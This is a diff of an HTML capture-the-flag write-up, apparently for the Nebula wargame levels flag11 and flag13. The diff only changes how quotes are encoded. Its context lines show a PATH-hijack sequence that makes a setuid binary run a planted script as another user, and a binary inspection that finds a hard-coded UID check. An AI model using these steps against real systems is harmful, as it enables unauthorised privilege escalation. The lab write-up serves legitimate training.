@@ -111,7 +111,7 @@
 Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so
 using open(2) creates a security hole, because the user might exploit the short time interval between
 checking and opening the file to manipulate it. For this reason, the use of this system call should be
-avoided. (In the example just described, a safer alternative would be to temporarily switch the process's
+avoided. (In the example just described, a safer alternative would be to temporarily switch the process&#39;s
 effective user ID to the real ID and then call open(2).)</code></pre>
 </div>
 
@@ -180,9 +180,9 @@ $ echo &quot;Content-Length: 1\n\c&quot; &gt; ./foo
 $ echo &quot;getflag; whoami&quot; &gt; ./b
 $ export PATH=~:$PATH
 $ /home/flag11/flag11 &lt; ~/foo
-sh: $'b\200\263': command not found
+sh: $&#39;b\200\263&#39;: command not found
 $ /home/flag11/flag11 &lt; ~/foo
-sh: $'b\300\241': command not found
+sh: $&#39;b\300\241&#39;: command not found
 $ /home/flag11/flag11 &lt; ~/foo
 You have successfully executed getflag on a target account
 flag11</code></pre>
@@ -298,9 +298,9 @@ You have successfully executed getflag on a target account</code></pre>
 <div>
   <pre><code class='console'>$ echo $UID
 1014
-$ printf '%x\n' 1014 # Our uid in hex
+$ printf &#39;%x\n&#39; 1014 # Our uid in hex
 3f6
-$ printf '%x\n' 1000 # FAKEUID in hex
+$ printf &#39;%x\n&#39; 1000 # FAKEUID in hex
 3e8
 $ objdump -d flag13 | grep 3e8
 80484f4:        3d e8 03 00 00      cmp     __$0x3e8__,%eax
